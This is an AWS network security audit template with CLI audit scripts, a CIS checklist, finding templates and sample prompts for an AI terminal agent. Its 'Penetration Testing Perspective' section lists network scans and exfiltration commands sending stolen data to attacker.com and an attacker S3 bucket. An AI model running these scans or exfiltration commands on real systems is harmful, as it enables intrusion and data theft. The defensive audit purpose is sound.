---
genre: hosting
category: network-security
analysis-type: iac
relevance:
  file-patterns:
    - "**/terraform/**"
    - "**/cloudformation/**"
  keywords:
    - aws_security_group
    - aws_vpc
    - aws_subnet
    - aws_network_acl
    - cidr
    - ingress
    - egress
  config-keys: []
  always-include: false
severity-scale: "Critical|High|Medium|Low|Info"
---

# Network Security Audit Template

**Purpose**: Assess AWS network security controls including VPC architecture, security groups, Network ACLs, Network Firewall, and traffic isolation.

**Frameworks**: CIS AWS Foundations Benchmark 5.1-5.4, AWS Well-Architected Security Pillar - Network Protection

---

## Agentic Prompt Examples

### Quick Network Security Audit
```
@terminal Audit AWS network security: check all security groups for overly 
permissive rules (0.0.0.0/0 on non-standard ports), identify unused security 
groups, review VPC flow logs configuration, check for default VPCs in use, 
and verify VPC peering connections are authorized. Document findings with 
severity ratings.
```

### Deep Network Assessment
```
@terminal Perform comprehensive AWS network security assessment: analyze all 
VPCs, subnets, route tables, NACLs, security groups, and Network Firewall rules. 
Identify network segmentation issues, lateral movement risks, egress filtering 
gaps, and VPC peering misconfigurations. Map findings to CIS benchmarks and 
generate remediation plan.
```

### Security Group Audit
```
@terminal Review all EC2 security groups across all regions: find rules allowing 
unrestricted access (0.0.0.0/0 or ::/0) on management ports (22, 3389, 3306, 5432), 
identify unused security groups, check for overly broad security group references, 
and verify egress filtering. Flag critical exposures.
```

---

## AWS CLI Commands

### 1. VPC Discovery

#### List All VPCs
```bash
# Get all VPCs in current region
aws ec2 describe-vpcs --output json > vpcs.json

# Summary table
aws ec2 describe-vpcs --query 'Vpcs[*].[VpcId,CidrBlock,IsDefault,Tags[?Key==`Name`].Value|[0]]' --output table

# Check for default VPCs (CIS 5.1 - should not be used)
default_vpcs=$(aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query 'Vpcs[*].VpcId' --output text)

if [ -n "$default_vpcs" ]; then
  echo "⚠️  MEDIUM: Default VPCs in use: $default_vpcs"
  echo "Recommendation: Migrate to custom VPCs with proper CIDR planning"
fi
```

#### VPC Multi-Region Check
```bash
# Check all regions for VPCs
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  echo "=== Region: $region ==="
  vpc_count=$(aws ec2 describe-vpcs --region "$region" --query 'length(Vpcs)' --output text)
  echo "VPCs: $vpc_count"
  
  if [ "$vpc_count" -gt 0 ]; then
    aws ec2 describe-vpcs --region "$region" --query 'Vpcs[*].[VpcId,CidrBlock,IsDefault]' --output table
  fi
  echo ""
done
```

### 2. Security Groups Audit

#### List All Security Groups
```bash
# Get all security groups
aws ec2 describe-security-groups --output json > security-groups.json

# Count security groups
aws ec2 describe-security-groups --query 'length(SecurityGroups)' --output text

# Security groups summary
aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,VpcId,Description]' --output table
```

#### Check for Overly Permissive Rules (CIS 5.2, 5.3)
```bash
# Find security groups allowing 0.0.0.0/0 on any port
echo "🔍 Checking for overly permissive security group rules..."

for sg in $(aws ec2 describe-security-groups --query 'SecurityGroups[*].GroupId' --output text); do
  # Get security group details
  sg_name=$(aws ec2 describe-security-groups --group-ids "$sg" --query 'SecurityGroups[0].GroupName' --output text)
  vpc_id=$(aws ec2 describe-security-groups --group-ids "$sg" --query 'SecurityGroups[0].VpcId' --output text)
  
  # Check inbound rules
  aws ec2 describe-security-groups --group-ids "$sg" --query 'SecurityGroups[0].IpPermissions[]' --output json | jq -r '.[] | 
    select(.IpRanges[]?.CidrIp == "0.0.0.0/0" or .Ipv6Ranges[]?.CidrIpv6 == "::/0") | 
    "SG: '"$sg"' ('"$sg_name"') | VPC: '"$vpc_id"' | Protocol: \(.IpProtocol) | Port: \(if .FromPort then "\(.FromPort)-\(.ToPort)" else "All" end) | CIDR: \(.IpRanges[]?.CidrIp // .Ipv6Ranges[]?.CidrIpv6)"'
done
```

#### Critical: Management Ports Open to Internet (CIS 5.2)
```bash
# Find SSH (22), RDP (3389), MySQL (3306), PostgreSQL (5432) exposed to 0.0.0.0/0
dangerous_ports=(22 3389 3306 5432 1433 27017 6379 5439 1521)

echo "🚨 Checking for management ports exposed to internet..."

for sg in $(aws ec2 describe-security-groups --query 'SecurityGroups[*].GroupId' --output text); do
  sg_name=$(aws ec2 describe-security-groups --group-ids "$sg" --query 'SecurityGroups[0].GroupName' --output text)
  
  for port in "${dangerous_ports[@]}"; do
    exposed=$(aws ec2 describe-security-groups --group-ids "$sg" --query "SecurityGroups[0].IpPermissions[?FromPort<=\`$port\` && ToPort>=\`$port\`] | [?IpRanges[?CidrIp=='0.0.0.0/0']]" --output json)
    
    if [ "$exposed" != "[]" ]; then
      case $port in
        22) service="SSH" ;;
        3389) service="RDP" ;;
        3306) service="MySQL" ;;
        5432) service="PostgreSQL" ;;
        1433) service="MSSQL" ;;
        27017) service="MongoDB" ;;
        6379) service="Redis" ;;
        5439) service="Redshift" ;;
        1521) service="Oracle" ;;
      esac
      
      echo "🚨 CRITICAL: SG $sg ($sg_name) allows $service (port $port) from 0.0.0.0/0"
    fi
  done
done
```

#### Unused Security Groups
```bash
# Find security groups not attached to any network interface
echo "🔍 Finding unused security groups..."

for sg in $(aws ec2 describe-security-groups --query 'SecurityGroups[?GroupName!=`default`].GroupId' --output text); do
  sg_name=$(aws ec2 describe-security-groups --group-ids "$sg" --query 'SecurityGroups[0].GroupName' --output text)
  
  # Check if attached to any network interface
  attached=$(aws ec2 describe-network-interfaces --filters "Name=group-id,Values=$sg" --query 'NetworkInterfaces[*].NetworkInterfaceId' --output text)
  
  if [ -z "$attached" ]; then
    echo "ℹ️  INFO: Security group $sg ($sg_name) is not attached to any resource"
    echo "  Recommendation: Review and delete if truly unused"
  fi
done
```

#### Security Groups Allowing All Outbound Traffic
```bash
# Check for overly permissive egress rules
echo "🔍 Checking for security groups with unrestricted egress..."

for sg in $(aws ec2 describe-security-groups --query 'SecurityGroups[*].GroupId' --output text); do
  sg_name=$(aws ec2 describe-security-groups --group-ids "$sg" --query 'SecurityGroups[0].GroupName' --output text)
  
  # Check for 0.0.0.0/0 on all protocols
  unrestricted_egress=$(aws ec2 describe-security-groups --group-ids "$sg" --query "SecurityGroups[0].IpPermissionsEgress[?IpProtocol=='-1' && IpRanges[?CidrIp=='0.0.0.0/0']]" --output json)
  
  if [ "$unrestricted_egress" != "[]" ]; then
    echo "⚠️  LOW: SG $sg ($sg_name) allows all outbound traffic"
    echo "  Consider: Implement egress filtering for data exfiltration prevention"
  fi
done
```

### 3. Network ACLs (NACLs)

#### List Network ACLs
```bash
# Get all NACLs
aws ec2 describe-network-acls --output json > network-acls.json

# Summary
aws ec2 describe-network-acls --query 'NetworkAcls[*].[NetworkAclId,VpcId,IsDefault,Tags[?Key==`Name`].Value|[0]]' --output table
```

#### Check for Permissive NACL Rules
```bash
# Find NACLs allowing 0.0.0.0/0 on all ports (overly permissive)
for nacl in $(aws ec2 describe-network-acls --query 'NetworkAcls[*].NetworkAclId' --output text); do
  echo "NACL: $nacl"
  
  # Check inbound rules
  aws ec2 describe-network-acls --network-acl-ids "$nacl" --query 'NetworkAcls[0].Entries[?Egress==`false`].[RuleNumber,Protocol,RuleAction,CidrBlock,PortRange.From,PortRange.To]' --output table
  
  echo "---"
done
```

### 4. VPC Flow Logs (CIS 3.7, 3.9)

#### Check VPC Flow Logs Status
```bash
# Verify flow logs are enabled for all VPCs
echo "🔍 Checking VPC Flow Logs configuration..."

for vpc in $(aws ec2 describe-vpcs --query 'Vpcs[*].VpcId' --output text); do
  flow_logs=$(aws ec2 describe-flow-logs --filter "Name=resource-id,Values=$vpc" --query 'FlowLogs[*].[FlowLogId,FlowLogStatus,LogDestinationType]' --output text)
  
  if [ -z "$flow_logs" ]; then
    echo "🚨 HIGH: VPC $vpc has NO flow logs enabled"
    echo "  Impact: No network traffic visibility for security monitoring"
  else
    echo "✓ VPC $vpc has flow logs enabled:"
    echo "$flow_logs"
  fi
  echo "---"
done
```

#### Flow Logs Multi-Region Check
```bash
# Check flow logs across all regions
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  echo "=== Region: $region ==="
  
  vpcs_without_logs=$(aws ec2 describe-vpcs --region "$region" --query 'Vpcs[*].VpcId' --output text | while read vpc; do
    flow_logs=$(aws ec2 describe-flow-logs --region "$region" --filter "Name=resource-id,Values=$vpc" --query 'FlowLogs[*].FlowLogId' --output text)
    if [ -z "$flow_logs" ]; then
      echo "$vpc"
    fi
  done)
  
  if [ -n "$vpcs_without_logs" ]; then
    echo "⚠️  VPCs without flow logs: $vpcs_without_logs"
  else
    echo "✓ All VPCs have flow logs enabled"
  fi
  echo ""
done
```

### 5. Internet Gateways and NAT Gateways

#### List Internet Gateways
```bash
# Find all IGWs and their attachments
aws ec2 describe-internet-gateways --output json > internet-gateways.json

# Summary
aws ec2 describe-internet-gateways --query 'InternetGateways[*].[InternetGatewayId,Attachments[0].VpcId,Tags[?Key==`Name`].Value|[0]]' --output table
```

#### List NAT Gateways
```bash
# Get all NAT gateways
aws ec2 describe-nat-gateways --output json > nat-gateways.json

# Summary with cost implications
aws ec2 describe-nat-gateways --query 'NatGateways[*].[NatGatewayId,State,VpcId,SubnetId,Tags[?Key==`Name`].Value|[0]]' --output table
```

### 6. Route Tables Analysis

#### Examine Route Tables
```bash
# Get all route tables
aws ec2 describe-route-tables --output json > route-tables.json

# Find routes to internet gateway (potential public subnets)
for rt in $(aws ec2 describe-route-tables --query 'RouteTables[*].RouteTableId' --output text); do
  vpc=$(aws ec2 describe-route-tables --route-table-ids "$rt" --query 'RouteTables[0].VpcId' --output text)
  
  # Check for IGW routes
  igw_routes=$(aws ec2 describe-route-tables --route-table-ids "$rt" --query 'RouteTables[0].Routes[?GatewayId!=`local` && starts_with(GatewayId,`igw-`)].[DestinationCidrBlock,GatewayId]' --output text)
  
  if [ -n "$igw_routes" ]; then
    echo "ℹ️  Route Table $rt (VPC: $vpc) has internet gateway route:"
    echo "$igw_routes"
    
    # Find associated subnets
    subnets=$(aws ec2 describe-route-tables --route-table-ids "$rt" --query 'RouteTables[0].Associations[?SubnetId!=null].SubnetId' --output text)
    if [ -n "$subnets" ]; then
      echo "  Associated public subnets: $subnets"
    fi
    echo "---"
  fi
done
```

### 7. VPC Peering Connections

#### Audit VPC Peering
```bash
# List all VPC peering connections
aws ec2 describe-vpc-peering-connections --output json > vpc-peering.json

# Summary
aws ec2 describe-vpc-peering-connections --query 'VpcPeeringConnections[*].[VpcPeeringConnectionId,Status.Code,RequesterVpcInfo.VpcId,AccepterVpcInfo.VpcId,Tags[?Key==`Name`].Value|[0]]' --output table

# Check for cross-account peering
for peer in $(aws ec2 describe-vpc-peering-connections --query 'VpcPeeringConnections[*].VpcPeeringConnectionId' --output text); do
  requester_owner=$(aws ec2 describe-vpc-peering-connections --vpc-peering-connection-ids "$peer" --query 'VpcPeeringConnections[0].RequesterVpcInfo.OwnerId' --output text)
  accepter_owner=$(aws ec2 describe-vpc-peering-connections --vpc-peering-connection-ids "$peer" --query 'VpcPeeringConnections[0].AccepterVpcInfo.OwnerId' --output text)
  
  if [ "$requester_owner" != "$accepter_owner" ]; then
    echo "ℹ️  INFO: VPC Peering $peer spans accounts: $requester_owner <-> $accepter_owner"
    echo "  Verify: Cross-account peering is authorized and necessary"
  fi
done
```

### 8. Transit Gateway (if in use)

#### Transit Gateway Configuration
```bash
# List Transit Gateways
aws ec2 describe-transit-gateways --output json > transit-gateways.json

# Check TGW route tables
for tgw in $(aws ec2 describe-transit-gateways --query 'TransitGateways[*].TransitGatewayId' --output text); do
  echo "Transit Gateway: $tgw"
  
  # Get route tables
  aws ec2 describe-transit-gateway-route-tables --filters "Name=transit-gateway-id,Values=$tgw" --query 'TransitGatewayRouteTables[*].[TransitGatewayRouteTableId,State,DefaultAssociationRouteTable,DefaultPropagationRouteTable]' --output table
  
  echo "---"
done
```

### 9. AWS Network Firewall

#### Check Network Firewall Deployment
```bash
# List Network Firewalls (requires network-firewall permissions)
aws network-firewall list-firewalls --output json > network-firewalls.json 2>/dev/null

if [ $? -eq 0 ]; then
  firewall_count=$(aws network-firewall list-firewalls --query 'length(Firewalls)' --output text)
  
  if [ "$firewall_count" -eq 0 ]; then
    echo "ℹ️  INFO: No AWS Network Firewalls deployed"
    echo "  Consider: Network Firewall for deep packet inspection and IDS/IPS"
  else
    echo "✓ AWS Network Firewall in use ($firewall_count deployed)"
    
    # Check firewall policies
    for fw in $(aws network-firewall list-firewalls --query 'Firewalls[*].FirewallName' --output text); do
      echo "Firewall: $fw"
      aws network-firewall describe-firewall --firewall-name "$fw" --query 'Firewall.[FirewallArn,FirewallPolicyArn,VpcId]' --output table
    done
  fi
fi
```

### 10. Elastic Load Balancers Security

#### ALB/NLB Security Configuration
```bash
# List Application Load Balancers
aws elbv2 describe-load-balancers --output json > load-balancers.json

# Check ALB/NLB security groups and schemes
for lb_arn in $(aws elbv2 describe-load-balancers --query 'LoadBalancers[*].LoadBalancerArn' --output text); do
  lb_name=$(aws elbv2 describe-load-balancers --load-balancer-arns "$lb_arn" --query 'LoadBalancers[0].LoadBalancerName' --output text)
  scheme=$(aws elbv2 describe-load-balancers --load-balancer-arns "$lb_arn" --query 'LoadBalancers[0].Scheme' --output text)
  
  echo "Load Balancer: $lb_name | Scheme: $scheme"
  
  if [ "$scheme" = "internet-facing" ]; then
    echo "  ⚠️  Internet-facing LB - verify intended public exposure"
    
    # Check security groups
    sgs=$(aws elbv2 describe-load-balancers --load-balancer-arns "$lb_arn" --query 'LoadBalancers[0].SecurityGroups[*]' --output text)
    echo "  Security Groups: $sgs"
  fi
  
  echo "---"
done
```

### 11. VPC Endpoints

#### Check VPC Endpoints (Gateway & Interface)
```bash
# List VPC endpoints
aws ec2 describe-vpc-endpoints --output json > vpc-endpoints.json

# Summary
aws ec2 describe-vpc-endpoints --query 'VpcEndpoints[*].[VpcEndpointId,ServiceName,VpcEndpointType,State,VpcId]' --output table

# Check if S3 and DynamoDB gateway endpoints exist (cost optimization + security)
for vpc in $(aws ec2 describe-vpcs --query 'Vpcs[*].VpcId' --output text); do
  s3_endpoint=$(aws ec2 describe-vpc-endpoints --filters "Name=vpc-id,Values=$vpc" "Name=service-name,Values=com.amazonaws.*.s3" --query 'VpcEndpoints[*].VpcEndpointId' --output text)
  dynamodb_endpoint=$(aws ec2 describe-vpc-endpoints --filters "Name=vpc-id,Values=$vpc" "Name=service-name,Values=com.amazonaws.*.dynamodb" --query 'VpcEndpoints[*].VpcEndpointId' --output text)
  
  if [ -z "$s3_endpoint" ]; then
    echo "ℹ️  INFO: VPC $vpc lacks S3 gateway endpoint"
    echo "  Benefit: Free, private S3 access without NAT gateway data charges"
  fi
  
  if [ -z "$dynamodb_endpoint" ]; then
    echo "ℹ️  INFO: VPC $vpc lacks DynamoDB gateway endpoint"
  fi
done
```

---

<!-- analysis: iac -->
## Security Checklist

### Critical (Immediate Action Required)

- [ ] **No management ports (22, 3389, 3306, 5432) open to 0.0.0.0/0** (CIS 5.2)
  - Command: Check security group rules for SSH/RDP/DB ports
  - Severity: CRITICAL
  - Finding: Direct internet exposure of management interfaces enables brute force attacks

- [ ] **No RDP (3389) open to internet** (CIS 5.3)
  - Command: Check security group rules for port 3389
  - Severity: CRITICAL
  - Finding: RDP is frequently targeted by ransomware operators

- [ ] **All VPCs have flow logs enabled** (CIS 3.9)
  - Command: `aws ec2 describe-flow-logs`
  - Severity: HIGH
  - Finding: Without flow logs, network intrusions and data exfiltration go undetected

### High Priority

- [ ] **Default VPCs not in use** (CIS 5.1)
  - Command: `aws ec2 describe-vpcs --filters "Name=isDefault,Values=true"`
  - Severity: MEDIUM
  - Finding: Default VPCs lack proper network segmentation and planning

- [ ] **Security groups follow least privilege** (CIS 5.4)
  - Command: Check for overly broad CIDR ranges and port ranges
  - Severity: HIGH
  - Finding: Overly permissive rules increase lateral movement risk

- [ ] **Unused security groups removed**
  - Command: Check network interface attachments
  - Severity: LOW
  - Finding: Reduces attack surface and management overhead

### Medium Priority

- [ ] **Network segmentation implemented**
  - Multiple tiers: public, private, data
  - Severity: MEDIUM
  - Finding: Proper segmentation limits blast radius of compromises

- [ ] **VPC peering connections documented and authorized**
  - Command: `aws ec2 describe-vpc-peering-connections`
  - Severity: MEDIUM
  - Finding: Undocumented peering may bypass security controls

- [ ] **Egress filtering in place**
  - Command: Check security group egress rules
  - Severity: MEDIUM
  - Finding: Prevents data exfiltration and C2 communications

### Best Practices

- [ ] **VPC endpoints used for AWS services**
  - Command: `aws ec2 describe-vpc-endpoints`
  - Severity: INFO
  - Finding: Improves security and reduces NAT gateway costs

- [ ] **Network Firewall deployed for IDS/IPS**
  - Command: `aws network-firewall list-firewalls`
  - Severity: INFO
  - Finding: Provides deep packet inspection and threat detection

- [ ] **Transit Gateway used for hub-and-spoke architecture** (if multi-VPC)
  - Command: `aws ec2 describe-transit-gateways`
  - Severity: INFO
  - Finding: Centralizes network management and control

---

## Findings Template

### Finding: [Title]

**Severity**: CRITICAL | HIGH | MEDIUM | LOW | INFO

**CIS Benchmark**: [e.g., 5.2 - Ensure no security group allows ingress from 0.0.0.0/0 to port 22]

**Description**: 
[Detailed description of the network security issue]

**Evidence**:
```bash
# AWS CLI command output
[paste output]
```

**Attack Scenario**:
1. [Step-by-step exploitation path]
2. [What attacker gains]
3. [Potential for lateral movement]

**Risk**:
- **Network Exposure**: [Scope of exposure]
- **Lateral Movement**: [Can attacker pivot to other resources?]
- **Data Exfiltration**: [Can data be stolen?]

**Affected Resources**:
- Security Group: [sg-xxxxx]
- VPC: [vpc-xxxxx]
- Associated Instances: [i-xxxxx, i-yyyyy]

**Remediation Steps**:

1. **Immediate**: Remove overly permissive rule
```bash
aws ec2 revoke-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 22 \
  --cidr 0.0.0.0/0
```

2. **Replace with restricted rule** (from corporate IP ranges only)
```bash
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 22 \
  --cidr 203.0.113.0/24
```

3. **Long-term**: Implement Systems Manager Session Manager (no SSH needed)

**Verification**:
```bash
aws ec2 describe-security-groups --group-ids sg-xxxxx --query 'SecurityGroups[0].IpPermissions'
```

**References**:
- CIS AWS Foundations Benchmark 5.2
- MITRE ATT&CK T1133 (External Remote Services)

---

## Example Findings

### Example 1: SSH Open to Internet

**Severity**: CRITICAL

**CIS Benchmark**: 5.2 - Ensure no security group allows ingress from 0.0.0.0/0 to port 22

**Description**: 
Security group sg-0abc123def456 allows SSH (TCP/22) from any internet source (0.0.0.0/0). This security group is attached to 3 production EC2 instances.

**Evidence**:
```
Security Group: sg-0abc123def456 (prod-web-sg)
Protocol: tcp
Port: 22
CIDR: 0.0.0.0/0

Attached Instances:
- i-0123456789abcdef0 (web-server-1)
- i-0123456789abcdef1 (web-server-2)
- i-0123456789abcdef2 (web-server-3)
```

**Attack Scenario**:
1. Attacker discovers open SSH port via port scan (Shodan, Masscan)
2. Attempts brute force attack against root/admin accounts
3. If successful or SSH key leaked, gains shell access to EC2 instance
4. Pivots to other instances in VPC via security group rules
5. Accesses S3 buckets via instance IAM role
6. Deploys ransomware or cryptocurrency miner

**Risk**:
- **Network Exposure**: CRITICAL - 3 production servers exposed to internet
- **Lateral Movement**: HIGH - Compromised instance can access other VPC resources
- **Data Exfiltration**: HIGH - Instance IAM role has S3 read permissions

**Affected Resources**:
- Security Group: sg-0abc123def456 (prod-web-sg)
- VPC: vpc-0a1b2c3d4e5f6g7h8
- Instances: i-0123456789abcdef0, i-0123456789abcdef1, i-0123456789abcdef2

**Remediation Steps**:

1. **Immediate** - Remove public SSH access:
```bash
aws ec2 revoke-security-group-ingress \
  --group-id sg-0abc123def456 \
  --protocol tcp \
  --port 22 \
  --cidr 0.0.0.0/0
```

2. **Short-term** - Add corporate IP range:
```bash
# Replace with your office IP range
aws ec2 authorize-security-group-ingress \
  --group-id sg-0abc123def456 \
  --protocol tcp \
  --port 22 \
  --cidr 203.0.113.0/24
```

3. **Best Practice** - Use AWS Systems Manager Session Manager:
```bash
# No SSH port needed - secure browser-based access
# Attach AmazonSSMManagedInstanceCore policy to instance role
# Access via: aws ssm start-session --target i-0123456789abcdef0
```

**Verification**:
```bash
aws ec2 describe-security-groups \
  --group-ids sg-0abc123def456 \
  --query 'SecurityGroups[0].IpPermissions[?FromPort==`22`]'
```

**References**:
- CIS AWS Foundations Benchmark 5.2
- MITRE ATT&CK T1133 (External Remote Services)
- OWASP Cloud Security - Network Security

---

## Network Segmentation Assessment

### Recommended VPC Architecture

```
┌─────────────────────────────────────────────────────────┐
│                         VPC                              │
│                    10.0.0.0/16                          │
│                                                         │
│  ┌───────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │ Public Subnet │  │Private Subnet│  │ Data Subnet  │ │
│  │  10.0.1.0/24  │  │ 10.0.10.0/24 │  │ 10.0.20.0/24 │ │
│  │               │  │              │  │              │ │
│  │ - ALB/NLB     │  │ - App Servers│  │ - RDS        │ │
│  │ - NAT GW      │  │ - Lambda     │  │ - Redshift   │ │
│  │ - Bastion     │  │ - ECS        │  │ - ElastiCache│ │
│  │               │  │              │  │              │ │
│  └───────┬───────┘  └──────┬───────┘  └──────┬───────┘ │
│          │                 │                  │         │
│   Internet Gateway    NAT Gateway        No Internet    │
│          │                 │                            │
└──────────┼─────────────────┼────────────────────────────┘
           │                 │
      Internet          Internet (outbound only)
```

### Segmentation Validation Script

```bash
#!/bin/bash
# Validate network segmentation

VPC_ID="vpc-xxxxx"

echo "=== Network Segmentation Audit for $VPC_ID ==="

# Get all subnets
subnets=$(aws ec2 describe-subnets --filters "Name=vpc-id,Values=$VPC_ID" --query 'Subnets[*].SubnetId' --output text)

for subnet in $subnets; do
  subnet_name=$(aws ec2 describe-subnets --subnet-ids "$subnet" --query 'Subnets[0].Tags[?Key==`Name`].Value|[0]' --output text)
  cidr=$(aws ec2 describe-subnets --subnet-ids "$subnet" --query 'Subnets[0].CidrBlock' --output text)
  
  # Get route table
  rt=$(aws ec2 describe-route-tables --filters "Name=association.subnet-id,Values=$subnet" --query 'RouteTables[0].RouteTableId' --output text)
  
  # Check for IGW route (public subnet indicator)
  has_igw=$(aws ec2 describe-route-tables --route-table-ids "$rt" --query 'RouteTables[0].Routes[?GatewayId!=null && starts_with(GatewayId,`igw-`)]' --output text)
  
  if [ -n "$has_igw" ]; then
    tier="PUBLIC"
  else
    tier="PRIVATE"
  fi
  
  echo "$tier | Subnet: $subnet ($subnet_name) | CIDR: $cidr | RT: $rt"
done
```

---

## Penetration Testing Perspective

### Network Enumeration

```bash
# Discover exposed services
# Run from outside AWS (attacker perspective)
nmap -sS -p 22,80,443,3389,3306,5432 <public-ip-range>

# Find open S3 buckets via DNS enumeration
dig +short <account-name>-backups.s3.amazonaws.com

# Discover ElasticSearch instances with public IPs
shodan search "product:elasticsearch country:US"
```

### Lateral Movement Paths

Once inside VPC (post-compromise):

```bash
# Enumerate VPC CIDR via metadata service
curl http://169.254.169.254/latest/meta-data/local-ipv4

# Scan internal network
nmap -sn 10.0.0.0/16

# Find RDS instances (typically 3306, 5432)
nmap -p 3306,5432 10.0.20.0/24

# Check for unencrypted Redis/Memcached
nmap -p 6379,11211 10.0.0.0/16
```

### Exfiltration Techniques

```bash
# DNS exfiltration (bypasses egress filtering)
while read line; do
  dig $line.attacker.com
done < /tmp/stolen-data.txt

# HTTPS exfiltration (looks like normal traffic)
curl -X POST https://attacker.com/exfil -d @/var/log/secrets.log

# S3 exfiltration (copy to attacker's bucket)
aws s3 sync /var/data/ s3://attacker-bucket/victim-data/
```

---

## Compliance Mapping

| CIS Control | Requirement | Priority |
|-------------|-------------|----------|
| 5.1 | Ensure no Network ACLs allow ingress from 0.0.0.0/0 to remote server administration ports | HIGH |
| 5.2 | Ensure no security groups allow ingress from 0.0.0.0/0 to remote server administration ports | CRITICAL |
| 5.3 | Ensure no security groups allow ingress from 0.0.0.0/0 to RDP port 3389 | CRITICAL |
| 5.4 | Ensure the default security group restricts all traffic | HIGH |
| 3.7 | Ensure CloudTrail logs are encrypted at rest using KMS CMKs | HIGH |
| 3.9 | Ensure VPC flow logging is enabled in all VPCs | HIGH |

---

## Summary Report Template

### Network Security Audit Summary

**Audit Date**: [YYYY-MM-DD]  
**Auditor**: [Name]  
**Scope**: [Account ID / VPCs]

#### Findings Overview

| Severity | Count |
|----------|-------|
| CRITICAL | X |
| HIGH | X |
| MEDIUM | X |
| LOW | X |
| INFO | X |

#### Key Metrics

- Total VPCs: X
- VPCs with Flow Logs: X (XX%)
- Security Groups: X
- Security Groups with 0.0.0.0/0 rules: X
- Management Ports Exposed: X (CRITICAL if >0)

#### Top Recommendations

1. Close all management ports (SSH/RDP) to internet
2. Enable VPC flow logs on all VPCs
3. Implement egress filtering
4. Deploy VPC endpoints for AWS services
5. Review and remove unused security groups

---

**Next Steps**: Remediate critical findings within 24 hours, high findings within 7 days.
